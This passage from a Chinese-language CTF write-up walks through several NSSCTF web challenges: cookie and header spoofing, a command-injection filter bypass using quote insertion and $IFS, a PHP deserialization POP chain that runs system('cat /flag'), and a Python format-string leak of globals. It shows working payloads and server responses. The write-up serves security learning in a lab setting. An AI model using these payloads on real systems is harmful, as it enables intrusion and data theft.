(Debian)</span><br><span class="line">&lt; X-Powered-By: PHP/7.2.34</span><br><span class="line">&lt; Set-Cookie: VIP=0</span><br><span class="line">&lt; Content-Length: 40</span><br><span class="line">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="line">&lt; </span><br><span class="line"><span class="bullet">*</span> Connection #0 to host node5.anna.nssctf.cn left intact</span><br><span class="line">You are not VIP,I will give flag to VIP! </span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl -H &quot;Cookie: VIP=1&quot; http://node5.anna.nssctf.cn:21254/ </span><br><span class="line">NSSCTF&#123;c874ce7b-4d2b-4f74-a57a-19bebdc129dd&#125;   </span><br></pre></td></tr></table></figure></div>
<h1 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h1><p><img src="https://pic1.imgdb.cn/item/67b9e45bd0e0a243d4022f90.png"></p>
<p>一个2048的游戏界面,随便按键，最后提示要达到50000分<br>查看页面源代码，这里有这个游戏的源码 ，然后ctrl+f搜索flag有关的<br><img src="https://pic1.imgdb.cn/item/67b9e51bd0e0a243d4022fa9.png"><br>发现这里计算分数用的是get请求，在flag.php界面<br>所以访问<code>http://node5.anna.nssctf.cn:22813/flag.php?score=50001</code>就能拿到flag</p>
<h1 id="babyRCE"><a href="#babyRCE" class="headerlink" title="babyRCE"></a>babyRCE</h1><p>题目：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$rce</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$rce</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hhhhhhacker!!!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里会执行<code>$rce</code>的内容，但是过滤了很多函数<br>先用ls看看所有的文件<br><img src="https://pic1.imgdb.cn/item/67b9ec61d0e0a243d40233d3.png"><br>这题中没有过滤<code>\</code><br>在linux中命令中间有分隔符，单引号双引号反斜杠反引号也可以照样执行命令比如<code>l&#39;&#39;s l&quot;&quot;s l\s l``s 所以用这种方式绕过，空格用</code>$IFS&#96;绕过,最后在源码中看到flag<br><img src="https://pic1.imgdb.cn/item/67b9eeb0d0e0a243d4023524.png"></p>
<h1 id="Do-you-know-HTTP"><a href="#Do-you-know-HTTP" class="headerlink" title="Do you know HTTP"></a>Do you know HTTP</h1><p>题目描述：检查一下你的学习成果吧<br>仅仅学习了 HTTP 请求头相关内容，你可能会发现浏览器已经不足以让你便利的去解决问题了，试试 burpsuite！<br>用bp抓包 根据原始页面的提示，把GET请求方法改成HS<br><img src="https://pic1.imgdb.cn/item/67b9f02ad0e0a243d4023572.png"><br>再加上<code>X-Forwarded-For: 127.0.0.1</code><br>而且这里每次都要重新发包，放到repeater模块不行,但是修改xff之后还是没反应，我就直接curl更改请求做了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl -X HS -H &#x27;X-Forwarded-For: 127.0.0.1&#x27; http://node5.anna.nssctf.cn:28687/ -v</span><br><span class="line"><span class="bullet">*</span> Host node5.anna.nssctf.cn:28687 was resolved.</span><br><span class="line"><span class="bullet">*</span> IPv6: (none)</span><br><span class="line"><span class="bullet">*</span> IPv4: 118.195.175.220</span><br><span class="line"><span class="bullet">*</span>   Trying 118.195.175.220:28687...</span><br><span class="line"><span class="bullet">*</span> Connected to node5.anna.nssctf.cn (118.195.175.220) port 28687</span><br><span class="line"><span class="bullet">*</span> using HTTP/1.x</span><br><span class="line"><span class="quote">&gt; HS / HTTP/1.1</span></span><br><span class="line"><span class="quote">&gt; Host: node5.anna.nssctf.cn:28687</span></span><br><span class="line"><span class="quote">&gt; User-Agent: curl/8.11.1</span></span><br><span class="line"><span class="quote">&gt; Accept: <span class="emphasis">*/*</span></span></span><br><span class="line"><span class="quote">&gt; X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="quote">&gt; </span></span><br><span class="line"><span class="quote">* Request completely sent off</span></span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Sat, 22 Feb 2025 15:54:59 GMT</span><br><span class="line">&lt; Server: Apache/2.4.38 (Debian)</span><br><span class="line">&lt; X-Powered-By: PHP/7.2.34</span><br><span class="line">&lt; Content-Length: 47</span><br><span class="line">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="line">&lt; </span><br><span class="line">我希望你是从&#x27;www.ltyyds.com&#x27;过来的！</span><br><span class="line"><span class="bullet">*</span> Connection #0 to host node5.anna.nssctf.cn left intact</span><br></pre></td></tr></table></figure></div>
<p>从哪里来就是要修改Referer</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl -X HS -H &#x27;X-Forwarded-For: 127.0.0.1&#x27; -H &#x27;Referer: www.ltyyds.com&#x27; http://node5.anna.nssctf.cn:28687/ -v</span><br><span class="line"><span class="bullet">*</span> Host node5.anna.nssctf.cn:28687 was resolved.</span><br><span class="line"><span class="bullet">*</span> IPv6: (none)</span><br><span class="line"><span class="bullet">*</span> IPv4: 118.195.175.220</span><br><span class="line"><span class="bullet">*</span>   Trying 118.195.175.220:28687...</span><br><span class="line"><span class="bullet">*</span> Connected to node5.anna.nssctf.cn (118.195.175.220) port 28687</span><br><span class="line"><span class="bullet">*</span> using HTTP/1.x</span><br><span class="line"><span class="quote">&gt; HS / HTTP/1.1</span></span><br><span class="line"><span class="quote">&gt; Host: node5.anna.nssctf.cn:28687</span></span><br><span class="line"><span class="quote">&gt; User-Agent: curl/8.11.1</span></span><br><span class="line"><span class="quote">&gt; Accept: <span class="emphasis">*/*</span></span></span><br><span class="line"><span class="quote">&gt; X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="quote">&gt; Referer: www.ltyyds.com</span></span><br><span class="line"><span class="quote">&gt; </span></span><br><span class="line"><span class="quote">* Request completely sent off</span></span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Sat, 22 Feb 2025 15:56:50 GMT</span><br><span class="line">&lt; Server: Apache/2.4.38 (Debian)</span><br><span class="line">&lt; X-Powered-By: PHP/7.2.34</span><br><span class="line">&lt; Vary: Accept-Encoding</span><br><span class="line">&lt; Content-Length: 85</span><br><span class="line">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="line">&lt; </span><br><span class="line">&#x27;LT&#x27;才是本题官方浏览器哦！</span><br><span class="line">想要得到flag，就用官方浏览器吧！</span><br><span class="line"><span class="bullet">*</span> Connection #0 to host node5.anna.nssctf.cn left intact</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>指定浏览器就是修改UA头</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl -X HS -H &#x27;X-Forwarded-For: 127.0.0.1&#x27; -H &#x27;Referer: www.ltyyds.com&#x27; -H &#x27;User-Agent: LT&#x27; http://node5.anna.nssctf.cn:28687/ -v</span><br><span class="line"><span class="bullet">*</span> Host node5.anna.nssctf.cn:28687 was resolved.</span><br><span class="line"><span class="bullet">*</span> IPv6: (none)</span><br><span class="line"><span class="bullet">*</span> IPv4: 118.195.175.220</span><br><span class="line"><span class="bullet">*</span>   Trying 118.195.175.220:28687...</span><br><span class="line"><span class="bullet">*</span> Connected to node5.anna.nssctf.cn (118.195.175.220) port 28687</span><br><span class="line"><span class="bullet">*</span> using HTTP/1.x</span><br><span class="line"><span class="quote">&gt; HS / HTTP/1.1</span></span><br><span class="line"><span class="quote">&gt; Host: node5.anna.nssctf.cn:28687</span></span><br><span class="line"><span class="quote">&gt; Accept: <span class="emphasis">*/*</span></span></span><br><span class="line"><span class="quote">&gt; X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="quote">&gt; Referer: www.ltyyds.com</span></span><br><span class="line"><span class="quote">&gt; User-Agent: LT</span></span><br><span class="line"><span class="quote">&gt; </span></span><br><span class="line"><span class="quote">* Request completely sent off</span></span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Sat, 22 Feb 2025 15:57:44 GMT</span><br><span class="line">&lt; Server: Apache/2.4.38 (Debian)</span><br><span class="line">&lt; X-Powered-By: PHP/7.2.34</span><br><span class="line">&lt; Content-Length: 44</span><br><span class="line">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="line">&lt; </span><br><span class="line"><span class="bullet">*</span> Connection #0 to host node5.anna.nssctf.cn left intact</span><br><span class="line">NSSCTF&#123;f20b6126-a90b-42dd-b586-fab1854476ae&#125;     </span><br></pre></td></tr></table></figure></div>
<h1 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">entrance</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start = <span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start-&gt;<span class="title function_ invoke__">helloworld</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">springboard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$middle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;middle-&gt;hs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$end</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;end = <span class="variable">$end</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$Attribute</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;serialize&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;serialize&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里要找pop链<br>最后我们想要用的是<code>evil</code>类中的__get函数的eval，<code>$this-&gt;end</code>就是我们要执行的命令<br>当你试图访问一个<strong>不存在</strong>或<strong>不可访问</strong>（如 <code>private</code>）的属性时，<code>__get()</code> 方法会被自动调用。<br>能够出发这个__get函数是<code>springboard</code> 中的__call函数，这里执行会<code>echo $this-&gt;middle-&gt;hs;1</code><br>就让这里echo一个evil不存在的属性就能触发<br>__call怎么触发     在 PHP 中，<code>__call()</code> 是一个 <strong>魔法方法</strong>，当调用<strong>未定义</strong>或<strong>不可访问</strong>（如 <code>private</code>）的方法时，它会被自动触发。<br>所以用<code>entrance</code>类中的<code>$this-&gt;start-&gt;helloworld();</code> 让<code>$this -&gt; start</code> 为springboard这样就能访问一个不存在的方法<br>payload:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">entrance</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">springboard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$middle</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">entrance</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">springboard</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; start = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; middle = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span> -&gt; end = <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">O:<span class="number">8</span>:<span class="string">&quot;entrance&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;O:<span class="number">11</span>:<span class="string">&quot;springboard&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;middle&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;end&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67b9f71cd0e0a243d40237ea.png"></p>
<h1 id="地狱通讯"><a href="#地狱通讯" class="headerlink" title="地狱通讯"></a>地狱通讯</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag, FLAG</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    ctx = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    f1ag = request.args.get(<span class="string">&#x27;f1ag&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    exp = request.args.get(<span class="string">&#x27;exp&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    flAg = FLAG(f1ag)</span><br><span class="line">    message = <span class="string">&quot;Your flag is &#123;0&#125;&quot;</span> + exp</span><br><span class="line">    <span class="keyword">if</span> exp == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> ctx</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> message.<span class="built_in">format</span>(flAg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>这个是用python的flask构造一个web界面的源码<br>f1ag和exp都是通过get请求传递，这里最后返回的时候用format把flAg放在message中的{0}位置<br>所以如果exp中也有{0}就可以访问到FLAG<br>在python中<br><strong>class</strong> 获取对象的类。<br><strong>init</strong> 获取类的构造方法。<br><strong>globals</strong> 获取该类定义时的全局变量。<br>payload为<code>?flag=1&amp;exp=&#123;0.__class__.__init__.__globals__&#125;</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">Your flag is &#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: None, <span class="string">&#x27;__package__&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader object at <span class="number">0</span>x7fc8364bbb10&gt;, <span class="string">&#x27;__spec__&#x27;</span>: ModuleSpec(name=<span class="string">&#x27;flag&#x27;</span>, loader=&lt;_frozen_importlib_external.SourceFileLoader object at <span class="number">0</span>x7fc8364bbb10&gt;, origin=<span class="string">&#x27;/var/www/html/flag.py&#x27;</span>), <span class="string">&#x27;__file__&#x27;</span>: <span class="string">&#x27;/var/www/html/flag.py&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>: <span class="string">&#x27;/var/www/html/__pycache__/flag.cpython-311.pyc&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>: &#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="string">&quot;Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil&#x27; object; Ellipsis represents `...&#x27; in slices.&quot;</span>, <span class="string">&#x27;__package__&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>: , <span class="string">&#x27;__spec__&#x27;</span>: ModuleSpec(name=<span class="string">&#x27;builtins&#x27;</span>, loader=, origin=<span class="string">&#x27;built-in&#x27;</span>), <span class="string">&#x27;__build_class__&#x27;</span>: , <span class="string">&#x27;__import__&#x27;</span>: , <span class="string">&#x27;abs&#x27;</span>: , <span class="string">&#x27;all&#x27;</span>: , <span class="string">&#x27;any&#x27;</span>: , <span class="string">&#x27;ascii&#x27;</span>: , <span class="string">&#x27;bin&#x27;</span>: , <span class="string">&#x27;breakpoint&#x27;</span>: , <span class="string">&#x27;callable&#x27;</span>: , <span class="string">&#x27;chr&#x27;</span>: , <span class="string">&#x27;compile&#x27;</span>: , <span class="string">&#x27;delattr&#x27;</span>: , <span class="string">&#x27;dir&#x27;</span>: , <span class="string">&#x27;divmod&#x27;</span>: , <span class="string">&#x27;eval&#x27;</span>: , <span class="string">&#x27;exec&#x27;</span>: , <span class="string">&#x27;format&#x27;</span>: , <span class="string">&#x27;getattr&#x27;</span>: , <span class="string">&#x27;globals&#x27;</span>: , <span class="string">&#x27;hasattr&#x27;</span>: , <span class="string">&#x27;hash&#x27;</span>: , <span class="string">&#x27;hex&#x27;</span>: , <span class="string">&#x27;id&#x27;</span>: , <span class="string">&#x27;input&#x27;</span>: , <span class="string">&#x27;isinstance&#x27;</span>: , <span class="string">&#x27;issubclass&#x27;</span>: , <span class="string">&#x27;iter&#x27;</span>: , <span class="string">&#x27;aiter&#x27;</span>: , <span class="string">&#x27;len&#x27;</span>: , <span class="string">&#x27;locals&#x27;</span>: , <span class="string">&#x27;max&#x27;</span>: , <span class="string">&#x27;min&#x27;</span>: , <span class="string">&#x27;next&#x27;</span>: , <span class="string">&#x27;anext&#x27;</span>: , <span class="string">&#x27;oct&#x27;</span>: , <span class="string">&#x27;ord&#x27;</span>: , <span class="string">&#x27;pow&#x27;</span>: , <span class="string">&#x27;print&#x27;</span>: , <span class="string">&#x27;repr&#x27;</span>: , <span class="string">&#x27;round&#x27;</span>: , <span class="string">&#x27;setattr&#x27;</span>: , <span class="string">&#x27;sorted&#x27;</span>: , <span class="string">&#x27;sum&#x27;</span>: , <span class="string">&#x27;vars&#x27;</span>: , <span class="string">&#x27;None&#x27;</span>: None, <span class="string">&#x27;Ellipsis&#x27;</span>: Ellipsis, <span class="string">&#x27;NotImplemented&#x27;</span>: NotImplemented, <span class="string">&#x27;False&#x27;</span>: False, <span class="string">&#x27;True&#x27;</span>: True, <span class="string">&#x27;bool&#x27;</span>: , <span class="string">&#x27;memoryview&#x27;</span>: , <span class="string">&#x27;bytearray&#x27;</span>: , <span class="string">&#x27;bytes&#x27;</span>: , <span class="string">&#x27;classmethod&#x27;</span>: , <span class="string">&#x27;complex&#x27;</span>: , <span class="string">&#x27;dict&#x27;</span>: , <span class="string">&#x27;enumerate&#x27;</span>: , <span class="string">&#x27;filter&#x27;</span>: , <span class="string">&#x27;float&#x27;</span>: , <span class="string">&#x27;frozenset&#x27;</span>: , <span class="string">&#x27;property&#x27;</span>: , <span class="string">&#x27;int&#x27;</span>: , <span class="string">&#x27;list&#x27;</span>: , <span class="string">&#x27;map&#x27;</span>: , <span class="string">&#x27;object&#x27;</span>: , <span class="string">&#x27;range&#x27;</span>: , <span class="string">&#x27;reversed&#x27;</span>: , <span class="string">&#x27;set&#x27;</span>: , <span class="string">&#x27;slice&#x27;</span>: , <span class="string">&#x27;staticmethod&#x27;</span>: , <span class="string">&#x27;str&#x27;</span>: , <span class="string">&#x27;super&#x27;</span>: , <span class="string">&#x27;tuple&#x27;</span>: , <span class="string">&#x27;type&#x27;</span>: , <span class="string">&#x27;zip&#x27;</span>: , <span class="string">&#x27;__debug__&#x27;</span>: True, <span class="string">&#x27;BaseException&#x27;</span>: , <span class="string">&#x27;BaseExceptionGroup&#x27;</span>: , <span class="string">&#x27;Exception&#x27;</span>: , <span class="string">&#x27;GeneratorExit&#x27;</span>: , <span class="string">&#x27;KeyboardInterrupt&#x27;</span>: , <span class="string">&#x27;SystemExit&#x27;</span>: , <span class="string">&#x27;ArithmeticError&#x27;</span>: , <span class="string">&#x27;AssertionError&#x27;</span>: , <span class="string">&#x27;AttributeError&#x27;</span>: , <span class="string">&#x27;BufferError&#x27;</span>: , <span class="string">&#x27;EOFError&#x27;</span>: , <span class="string">&#x27;ImportError&#x27;</span>: , <span class="string">&#x27;LookupError&#x27;</span>: , <span class="string">&#x27;MemoryError&#x27;</span>: , <span class="string">&#x27;NameError&#x27;</span>: , <span class="string">&#x27;OSError&#x27;</span>: , <span class="string">&#x27;ReferenceError&#x27;</span>: , <span class="string">&#x27;RuntimeError&#x27;</span>: , <span class="string">&#x27;StopAsyncIteration&#x27;</span>: , <span class="string">&#x27;StopIteration&#x27;</span>: , <span class="string">&#x27;SyntaxError&#x27;</span>: , <span class="string">&#x27;SystemError&#x27;</span>: , <span class="string">&#x27;TypeError&#x27;</span>: , <span class="string">&#x27;ValueError&#x27;</span>: , <span class="string">&#x27;Warning&#x27;</span>: , <span class="string">&#x27;FloatingPointError&#x27;</span>: , <span class="string">&#x27;OverflowError&#x27;</span>: , <span class="string">&#x27;ZeroDivisionError&#x27;</span>: , <span class="string">&#x27;BytesWarning&#x27;</span>: , <span class="string">&#x27;DeprecationWarning&#x27;</span>: , <span class="string">&#x27;EncodingWarning&#x27;</span>: , <span class="string">&#x27;FutureWarning&#x27;</span>: , <span class="string">&#x27;ImportWarning&#x27;</span>: , <span class="string">&#x27;PendingDeprecationWarning&#x27;</span>: , <span class="string">&#x27;ResourceWarning&#x27;</span>: , <span class="string">&#x27;RuntimeWarning&#x27;</span>: , <span class="string">&#x27;SyntaxWarning&#x27;</span>: , <span class="string">&#x27;UnicodeWarning&#x27;</span>: , <span class="string">&#x27;UserWarning&#x27;</span>: , <span class="string">&#x27;BlockingIOError&#x27;</span>: , <span class="string">&#x27;ChildProcessError&#x27;</span>: , <span class="string">&#x27;ConnectionError&#x27;</span>: , <span class="string">&#x27;FileExistsError&#x27;</span>: , <span class="string">&#x27;FileNotFoundError&#x27;</span>: , <span class="string">&#x27;InterruptedError&#x27;</span>: , <span class="string">&#x27;IsADirectoryError&#x27;</span>: , <span class="string">&#x27;NotADirectoryError&#x27;</span>: , <span class="string">&#x27;PermissionError&#x27;</span>: , <span class="string">&#x27;ProcessLookupError&#x27;</span>: , <span class="string">&#x27;TimeoutError&#x27;</span>: , <span class="string">&#x27;IndentationError&#x27;</span>: , <span class="string">&#x27;IndexError&#x27;</span>: , <span class="string">&#x27;KeyError&#x27;</span>: , <span class="string">&#x27;ModuleNotFoundError&#x27;</span>: , <span class="string">&#x27;NotImplementedError&#x27;</span>: , <span class="string">&#x27;RecursionError&#x27;</span>: , <span class="string">&#x27;UnboundLocalError&#x27;</span>: , <span class="string">&#x27;UnicodeError&#x27;</span>: , <span class="string">&#x27;BrokenPipeError&#x27;</span>: , <span class="string">&#x27;ConnectionAbortedError&#x27;</span>: , <span class="string">&#x27;ConnectionRefusedError&#x27;</span>: , <span class="string">&#x27;ConnectionResetError&#x27;</span>: , <span class="string">&#x27;TabError&#x27;</span>: , <span class="string">&#x27;UnicodeDecodeError&#x27;</span>: , <span class="string">&#x27;UnicodeEncodeError&#x27;</span>: , <span class="string">&#x27;UnicodeTranslateError&#x27;</span>: , <span class="string">&#x27;ExceptionGroup&#x27;</span>: , <span class="string">&#x27;EnvironmentError&#x27;</span>: , <span class="string">&#x27;IOError&#x27;</span>: , <span class="string">&#x27;open&#x27;</span>: , <span class="string">&#x27;quit&#x27;</span>: Use quit() or Ctrl-D (i.e. EOF) to <span class="keyword">exit</span>, <span class="string">&#x27;exit&#x27;</span>: Use <span class="keyword">exit</span>() or Ctrl-D (i.e. EOF) to <span class="keyword">exit</span>, <span class="string">&#x27;copyright&#x27;</span>: Copyright (c) <span class="number">2001</span>-<span class="number">2022</span> Python Software Foundation. All Rights Reserved. Copyright (c) <span class="number">2000</span> BeOpen.com. All Rights Reserved. Copyright (c) <span class="number">1995</span>-<span class="number">2001</span> Corporation <span class="keyword">for</span> National Research Initiatives. All Rights Reserved. Copyright (c) <span class="number">1991</span>-<span class="number">1995</span> Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., <span class="string">&#x27;credits&#x27;</span>: Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands <span class="keyword">for</span> supporting Python development. See www.python.org <span class="keyword">for</span> more information., <span class="string">&#x27;license&#x27;</span>: Type license() to see the full license text, <span class="string">&#x27;help&#x27;</span>: Type help() <span class="keyword">for</span> interactive help, or help(object) <span class="keyword">for</span> help about object.&#125;, <span class="string">&#x27;os&#x27;</span>: , <span class="string">&#x27;flag&#x27;</span>: <span class="string">&#x27;NSSCTF&#123;d49ac46c-0a9a-4a13-9c83-5a0fa1d8111c&#125;&#x27;</span>, <span class="string">&#x27;FLAG&#x27;</span>: &#125;</span><br></pre></td></tr></table></figure></div>

